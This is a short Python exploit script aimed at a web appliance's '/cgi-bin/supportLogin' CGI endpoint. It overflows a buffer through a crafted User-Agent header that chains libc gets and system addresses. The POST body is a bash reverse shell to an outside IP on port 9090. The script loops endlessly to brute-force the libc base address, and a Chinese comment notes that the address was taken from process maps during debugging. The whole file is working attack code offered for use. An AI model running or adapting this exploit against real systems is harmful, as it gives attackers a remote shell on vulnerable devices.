import struct
import requests


def p32(a):
    return struct.pack("<I", a)


def pwn(libc):
    func_system = libc + 0x3DFC0
    func_gets = libc + 0x63590
    bss = 0x0804EB4C
    data_on_bss = bss
    data = b'/bin/bash -i >& /dev/tcp/192.168.157.131/9090 0>&1;'
    check_1 = b'Mac OS X'
    check_2 = b'Safari'
    check_3 = b'Version/'
    # padding2ebp = b'A' * 0x3c + b'\xde\xad\xbe\xef'
    padding2ebp = b'A' * 0x3c
    header_HTTP_USER_AGENT = check_1 + check_2 + check_3 + padding2ebp + \
        p32(func_gets) + p32(func_system) + p32(bss) + \
        p32(data_on_bss) + b' cougar'

    session = requests.Session()
    headers = {
        # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": header_HTTP_USER_AGENT,
        # "Accept-Language": "en-US,en;q=0.5",
        # "Accept-Encoding": "gzip, deflate"
    }
    response = session.post("https://192.168.157.10/cgi-bin/supportLogin",
                            headers=headers, data=data, verify=False)
    print(response.status_code)
    # print(response.content)


while(True):
    pwn(0xb7140000) # 在一次动调时通过 cat /proc/xxx/maps 得到的 "libc-2.14.1.so" 的加载基址
    # pwn(0xb7203000)

# ASLR off
# pwn(0xb7959000)
